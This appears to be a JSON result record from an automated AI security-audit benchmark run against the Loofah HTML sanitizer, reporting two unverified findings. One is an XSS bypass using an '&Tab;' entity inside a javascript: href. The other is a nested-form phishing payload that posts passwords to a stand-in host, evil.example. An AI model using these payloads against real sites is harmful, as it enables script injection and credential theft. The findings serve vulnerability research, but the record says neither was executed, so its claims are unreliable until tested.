@@ -1,0 +1,158 @@
+{
+ "arm": "K2",
+ "repo": "loofah-scrub",
+ "rep": 1,
+ "model": "haiku",
+ "suite": "cvefix",
+ "config_id": "e1c1143e",
+ "status": "success",
+ "gen_cost": 0.11980111,
+ "trace": {
+  "tools": {
+   "Read": 18,
+   "Glob": 4,
+   "StructuredOutput": 1
+  },
+  "skills": [],
+  "reads": [
+   "/tmp/egf-bvqalkmz/expertise/INDEX.md",
+   "/tmp/egf-bvqalkmz/r/lib/loofah/html5/scrub.rb",
+   "/tmp/egf-bvqalkmz/r/lib/loofah/html5/safelist.rb",
+   "/tmp/egf-bvqalkmz/r/lib/loofah/scrubbers.rb",
+   "/tmp/egf-bvqalkmz/r/lib/loofah/scrubber.rb",
+   "/tmp/egf-bvqalkmz/r/lib/loofah/html5/document_fragment.rb",
+   "/tmp/egf-bvqalkmz/r/lib/loofah/html4/document_fragment.rb",
+   "/tmp/egf-bvqalkmz/r/lib/loofah/metahelpers.rb",
+   "/tmp/egf-bvqalkmz/r/lib/loofah/html5/libxml2_workarounds.rb",
+   "/tmp/egf-bvqalkmz/r/lib/loofah/helpers.rb",
+   "/tmp/egf-bvqalkmz/r/lib/loofah/concerns.rb",
+   "/tmp/egf-bvqalkmz/r/lib/loofah.rb",
+   "/tmp/egf-bvqalkmz/r/lib/loofah/html5/document.rb",
+   "/tmp/egf-bvqalkmz/r/lib/loofah/html4/document.rb",
+   "/tmp/egf-bvqalkmz/r/lib/loofah/xml/document.rb",
+   "/tmp/egf-bvqalkmz/expertise/cases/08-sanitize-before-decode.md",
+   "/tmp/egf-bvqalkmz/expertise/cases/04-url-validate-reparse.md",
+   "/tmp/egf-bvqalkmz/expertise/cases/24-regex-unanchored.md"
+  ]
+ },
+ "findings": [
+  {
+   "finding": {
+    "id": "F1",
+    "file": "lib/loofah/html5/scrub.rb",
+    "line": 170,
+    "claim": "allowed_uri? does not decode HTML5-only named entities (&Tab;, &NewLine;) before checking the scheme, so javascript: URLs hidden behind them pass the href check. On the HTML4 path, libxml2 serializes href without escaping '&', so the browser decodes &Tab; back to a tab, which the URL parser strips, yielding an executable javascript: href (XSS on click).",
+    "source": "Attacker-controlled HTML attribute text: <a href=\"java&amp;Tab;script:alert(1)\">x</a> (or single-encoded java&Tab;script:alert(1)). The HTML4 parser (libxml2) leaves the unknown named reference '&Tab;' as literal text in the DOM value.",
+    "sink": "Protected operation: emitting an executable href into HTML output. Loofah::HtmlFragmentBehavior#to_s (lib/loofah/concerns.rb:197-199) serializes via libxml2, which writes href values with '&' and ';' unescaped (libxml2 HTMLtree.c htmlAttrDumpOutput, href exclusion set \"@/:=?;#%&,+\"). Browser then decodes &Tab; and removes the tab, producing javascript:.",
+    "trace": [
+     {
+      "file": "lib/loofah.rb",
+      "line": 83,
+      "note": "html4_fragment entry point (also Loofah.fragment alias line 140; Loofah::Helpers.sanitize uses it at helpers.rb:22)"
+     },
+     {
+      "file": "lib/loofah/html5/scrub.rb",
+      "line": 60,
+      "note": "scrub_attributes: href is in ALLOWED_ATTRIBUTES (safelist.rb:265) so it is not removed as unknown"
+     },
+     {
+      "file": "lib/loofah/html5/scrub.rb",
+      "line": 65,
+      "note": "href is in ATTR_VAL_IS_URI (safelist.rb:585), so the URI check runs"
+     },
+     {
+      "file": "lib/loofah/html5/scrub.rb",
+      "line": 188,
+      "note": "scrub_uri_attribute calls allowed_uri? on the DOM value"
+     },
+     {
+      "file": "lib/loofah/html5/scrub.rb",
+      "line": 172,
+      "note": "CGI.unescapeHTML decodes only apos/amp/quot/gt/lt and numeric refs, so '&Tab;' is left alone"
+     },
+     {
+      "file": "lib/loofah/html5/scrub.rb",
+      "line": 173,
+      "note": "CONTROL_CHARACTERS removes raw control/space chars only; the entity is not a raw control char yet"
+     },
+     {
+      "file": "lib/loofah/html5/scrub.rb",
+      "line": 174,
+      "note": "the only entity special-case is &colon;; &Tab;/&NewLine; are not normalized"
+     },
+     {
+      "file": "lib/loofah/html5/scrub.rb",
+      "line": 176,
+      "note": "URI_PROTOCOL_REGEX /\\A[a-z][a-z0-9+\\-.]*:/ fails at '&' in 'java&tab;script:', so the protocol/ALLOWED_PROTOCOLS check is skipped"
+     },
+     {
+      "file": "lib/loofah/html5/scrub.rb",
+      "line": 185,
+      "note": "falls through to 'true': the value is treated as a relative URL and kept"
+     },
+     {
+      "file": "lib/loofah/html5/scrub.rb",
+      "line": 202,
+      "note": "force_correct_attribute_escaping! only encodes space and double-quote on href (line 217), not '&'"
+     },
+     {
+      "file": "lib/loofah/concerns.rb",
+      "line": 198,
+      "note": "to_s serializes the surviving DOM via libxml2, emitting href=\"java&Tab;script:alert(1)\" unescaped"
+     }
+    ],
+    "guards_checked": "(1) Control-char stripping before and after decode (scrub.rb:172-173): does not touch named entities. (2) &colon; normalization (scrub.rb:174): only that one entity. (3) PROTOCOL_SEPARATOR/URI_PROTOCOL_REGEX scheme check (scrub.rb:176-183): anchored, so '&' defeats it. (4) ALLOWED_PROTOCOLS (safelist.rb:988-1016): irrelevant since the check is skipped. (5) force_correct_attribute_escaping! (scrub.rb:202-221): space and quote only. (6) Parser-side decoding: libxml2 HTML4 leaves unknown '&Tab;' literal. Not checked: whether Nokogiri's HTML5 serializer escapes '&' in attributes (HTML5 path); this finding is specific to the HTML4/libxml2 path. Verification status: NOT executed (no execution tool in this session); libxml2 serializer behavior is from its source as I recall it and should be confirmed with a one-line test.",
+    "repro": "Loofah.html4_fragment('<a href=\"java&amp;Tab;script:alert(1)\">x</a>').scrub!(:strip).to_s  # expected: <a href=\"java&Tab;script:alert(1)\">x</a>\nLoofah::HTML5::Scrub.allowed_uri?(\"java&Tab;script:alert(1)\")  # expected: true (should be false)\nLoofah::Helpers.sanitize('<a href=\"java&amp;Tab;script:alert(1)\">x</a>')  # same bypass via the Rails-sanitize replacement"
+   },
+   "verdict": null,
+   "verdict_status": "skipped"
+  },
+  {
+   "finding": {
+    "id": "F2",
+    "file": "lib/loofah/helpers.rb",
+    "line": 24,
+    "claim": "Helpers.sanitize intends to remove <form> elements, but its XPath './form' only matches direct children of the fragment root. Nested forms survive with their action attribute and input fields, which enables credential-phishing form injection.",
+    "source": "Attacker-controlled HTML input to Loofah::Helpers.sanitize, e.g. <div><form action=\"https://evil.example/collect\"><input name=\"password\" type=\"password\"><button>Sign in</button></form></div>.",
+    "sink": "Protected operation: the sanitizer's form-removal guarantee (output must contain no form elements). The surviving form is rendered in the victim's page and submits to the attacker's origin.",
+    "trace": [
+     {
+      "file": "lib/loofah/helpers.rb",
+      "line": 22,
+      "note": "Loofah.html4_fragment parses the input"
+     },
+     {
+      "file": "lib/loofah/helpers.rb",
+      "line": 23,
+      "note": "scrub!(:strip): form is in ACCEPTABLE_ELEMENTS (safelist.rb:89), so Strip keeps it and the nested form survives strip"
+     },
+     {
+      "file": "lib/loofah/html5/scrub.rb",
+      "line": 43,
+      "note": "allowed_element?: form is allowed, so attributes are scrubbed rather than the element removed"
+     },
+     {
+      "file": "lib/loofah/html5/scrub.rb",
+      "line": 60,
+      "note": "action is in ALLOWED_ATTRIBUTES (safelist.rb:237) and in ATTR_VAL_IS_URI (safelist.rb:583); https://evil.example passes allowed_uri? (scrub.rb:170-186) and is kept"
+     },
+     {
+      "file": "lib/loofah/helpers.rb",
+      "line": 24,
+      "note": "xpath('./form') matches only direct children of the fragment, so the nested <form> inside <div> is not removed"
+     },
+     {
+      "file": "lib/loofah/helpers.rb",
+      "line": 25,
+      "note": "to_s emits the nested form, input and button"
+     }
+    ],
+    "guards_checked": "(1) Strip scrubber: keeps form (form, input and button are on the safelist). (2) attribute scrubbing: action is allowed and https:// is a permitted protocol. (3) The explicit form-removal step at line 24 is the only control, and it is scoped too narrowly. Severity depends on whether form removal is an intended guarantee of Helpers.sanitize; the code clearly attempts it, so I treat it as in-scope. Verification status: NOT executed; confirmed by reading the XPath scope and safelist membership.",
+    "repro": "Loofah::Helpers.sanitize('<div><form action=\"https://evil.example/collect\"><input name=\"password\" type=\"password\"><button>Sign in</button></form></div>')  # output still contains <form action=\"https://evil.example/collect\">. Fix: xpath(\".//form\")."
+   },
+   "verdict": null,
+   "verdict_status": "skipped"
+  }
+ ],
+ "verify_cost": 0.0
+}
